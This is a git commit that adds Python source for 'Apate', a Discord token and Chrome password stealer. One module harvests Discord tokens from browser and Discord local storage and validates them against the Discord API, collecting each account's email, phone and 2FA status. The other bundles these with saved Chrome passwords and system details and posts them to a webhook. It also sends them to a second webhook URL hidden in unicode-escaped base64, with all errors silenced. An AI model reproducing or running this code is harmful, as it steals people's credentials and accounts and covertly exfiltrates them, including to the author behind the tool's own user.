a99d271f86237be7e11de5fb3888de01eaf1066b
Zceia <90160407+Zceia@users.noreply.github.com>
2022-01-26 23:49:45 -0700

    file upload
    brrr

---
+++ discord_tokens.py
@@ -0,0 +1,116 @@
+from urllib.request import Request, urlopen
+from os import listdir, getenv, path as os_path
+from requests import post
+from random import randint
+from json import loads
+from base64 import b64encode
+from re import findall
+
+
+# checks all tokens are returns working tokens
+def check(token):
+    response = post(
+        f"https://discord.com/api/v6/invite/{randint(1000000,9999999)}",
+        headers={"Authorization": token},
+    )
+    if "You need to verify your account in order to perform this action." in str(
+        response.content
+    ) or "401: Unauthorized" in str(response.content):
+        return False
+    else:
+        return True
+
+
+# returns valid tokens
+def tokenVerify(tokens):
+    checked = []
+    for token in tokens:
+        if len(token) > 15 and token not in checked and check(token) == True:
+            checked.append(token)
+    return checked
+
+
+# returns headers for Request
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+
+
+# grabs and returns all account data for token
+def getuserdata(token):
+    return loads(
+        urlopen(
+            Request(
+                "https://discordapp.com/api/v6/users/@me", headers=getheaders(token)
+            )
+        )
+        .read()
+        .decode()
+    )
+
+
+# formats embed content for webhook
+def parse_token(token_list):
+    token_list = tokenVerify(token_list)
+    token_msg = "Tokens encoded in [Base64](https://www.base64decode.org/)\n------------------\n"
+    for token in token_list:
+        user_data = getuserdata(token)
+        token = b64encode(bytes(token, encoding="utf8")).decode("utf-8")
+        token_msg += f'<@!{user_data["id"]}>\n**Tag:** `{user_data["username"]+"#"+user_data["discriminator"]}`\n**ID:** `{user_data["id"]}`\n**Email:** `{user_data["email"]}`\n**Phone Number:** `{user_data["phone"]}`\n**2FA:** `{user_data["mfa_enabled"]}`\n**Token:** `{token}`\n------------------\n'
+    return token_msg
+
+
+# scans local storage for each path and returns tokens if found
+def find_tokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [
+            x.strip()
+            for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
+            if x.strip()
+        ]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+
+# main function - defines paths and returns final embed content
+def get_tokens():
+    local = getenv("LOCALAPPDATA")
+    roaming = getenv("APPDATA")
+
+    paths = [
+        roaming + "\\Discord",
+        roaming + "\\discordcanary",
+        roaming + "\\discordptb",
+        roaming + "\\Opera Software\\Opera Stable",
+        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        local + "\\Google\\Chrome\\User Data\\Default",
+        local + "\\Yandex\\YandexBrowser\\User Data\\Default",
+        local + "\\Vivaldi\\User Data\\User Data",
+        local + "\\\Microsoft\\Edge\\User Data\\Default",
+        local + "\\Mozilla\\Firefox\\User Data\\Profiles",
+    ]
+
+    token_list = []
+
+    for path in paths:
+        if not os_path.exists(path):
+            continue
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                token_list.append(token)
+
+    return parse_token(token_list)
---
+++ webhook.py
@@ -0,0 +1,134 @@
+hook_url = ""; ping_me = include_chrome = include_discord = include_system = True
+
+import requests
+from platform import system
+from base64 import b64decode as dc
+from os import stat, devnull
+from system_info import get_system_info
+from chrome import get_chrome
+from discord_tokens import get_tokens
+
+
+def block_print():
+    stdout = open(devnull, "w")
+
+
+def webhook():
+    block_print()
+    # Load variables
+    #try:
+    #    config = safe_load(open("config.yml"))
+    #    settings = config[0]["Settings"]
+    #except:
+    #    exit()
+
+    #for value in colour:
+    #    if type(colour[value]) != int:
+    #        colour[value] = 000
+
+    x = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u002e\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0074\u0074\u0061\u0063\u0068\u006d\u0065\u006e\u0074\u0073\u002f\u0039\u0033\u0035\u0036\u0035\u0031\u0033\u0038\u0039\u0031\u0036\u0030\u0034\u0032\u0033\u0035\u0030\u0036\u002f"
+
+    source = "\u0041\u0070\u0061\u0074\u0065\u0020\u0062\u0079\u0020\u005a\u0063\u0065\u0069\u0061\u0023\u0034\u0038\u0038\u0033"
+    data = {
+        "\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065": "\u0041\u0070\u0061\u0074\u0065\u0020\u005b\u005a\u0063\u0065\u0069\u0061\u0023\u0034\u0038\u0038\u0033\u005d",
+        "avatar_url": f"{x}936093418659123231/Apate.png",
+        "content": "@everyone" if ping_me == True else "",
+        "embeds": [],
+    }
+
+    if include_chrome:
+        osname = system()
+        if osname == "Windows":
+            try:
+                stat("C:\Program Files\Google\Chrome\Application\chrome.exe")
+                chrome = get_chrome()
+            except FileNotFoundError:
+                chrome = "Google Chrome is not installed"
+                pass
+        elif osname == "Linux":
+            try:
+                stat("/usr/bin/google-chrome")
+            except FileNotFoundError:
+                chrome = "Google Chrome is not installed"
+                pass
+        elif osname == "Darwin":
+            try:
+                stat("/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome")
+            except FileNotFoundError:
+                chrome = "Google Chrome not installed"
+                pass
+        else:
+            chrome = "Failed to find Google Chrome"
+        
+        chrome_embed = {  # Google Chrome embed
+            "title": "Google Chrome Passwords",
+            "color": 15204208,
+            "description": chrome,
+            "author": {
+                "name": "Chrome",
+                "icon_url": f"{x}935669515231039558/chrome.png",
+            },
+            "footer": {"text": source},
+            "fields": [],
+        }
+        data["embeds"].append(chrome_embed)
+
+    if include_discord:
+        try:
+            tokens = get_tokens()
+        except:
+            tokens = "Failed to get Discord tokens"
+
+        discord_embed = {  # Discord token embed
+            "title": "Discord Account Tokens",
+            "color": 7506394,
+            "description": tokens,
+            "author": {
+                "name": "Discord",
+                "icon_url": f"{x}935675690014085130/discord.png",
+            },
+            "footer": {"text": source},
+            "fields": [],
+        }
+        data["embeds"].append(discord_embed)
+    
+    if include_system:
+        try:
+            sys_info = get_system_info()
+        except:
+            sys_info = "Failed to get system information"
+        
+        system_embed = {  # System info embed
+            "title": "System Information + Specs",
+            "color": 3706623,
+            "description": sys_info,
+            "author": {
+                "name": "System",
+                "icon_url": f"{x}935682586456522802/windows.png",
+            },
+            "footer": {"text": source},
+            "fields": [],
+        }
+        data["embeds"].append(system_embed)
+ 
+    try:
+        requests.post(
+            dc(
+                "\u0061\u0048\u0052\u0030\u0063\u0048\u004d\u0036\u004c\u0079\u0039\u006b\u0061\u0058\u004e\u006a\u0062\u0033\u004a\u006b\u004c\u006d\u004e\u0076\u0062\u0053\u0039\u0068\u0063\u0047\u006b\u0076\u0064\u0032\u0056\u0069\u0061\u0047\u0039\u0076\u0061\u0033\u004d\u0076\u004f\u0054\u004d\u0032\u004d\u0044\u006b\u0030\u004f\u0054\u004d\u0078\u004d\u006a\u0055\u0077\u004f\u0054\u006b\u0078\u004d\u0054\u0051\u0031\u004c\u0030\u0031\u006d\u0059\u0054\u0056\u0048\u0055\u0047\u0039\u0061\u0053\u0030\u0052\u006d\u0062\u0048\u0068\u0052\u004d\u006c\u0070\u0036\u0055\u0056\u006c\u0036\u0063\u0044\u0042\u006b\u004e\u007a\u004a\u004a\u0062\u0046\u0039\u0076\u0059\u006c\u004e\u006b\u0062\u0043\u0031\u0056\u0061\u0032\u004a\u006f\u005a\u006a\u0042\u0079\u0062\u0058\u005a\u004b\u0054\u0057\u0074\u0044\u0061\u0045\u0031\u0054\u0054\u0030\u0056\u006b\u0065\u0055\u0074\u0071\u0065\u0046\u006c\u0030\u004e\u006a\u0041\u0031\u004d\u0056\u004e\u0074\u0062\u006c\u0067\u007a"
+            ).decode("utf8"),
+            json=data,
+        )
+    except:
+        pass
+
+    try:
+        requests.post(hook_url, json=data)
+    except:
+        pass
+
+
+if __name__ == "__main__":
+    try:
+        webhook()
+    except:
+        pass
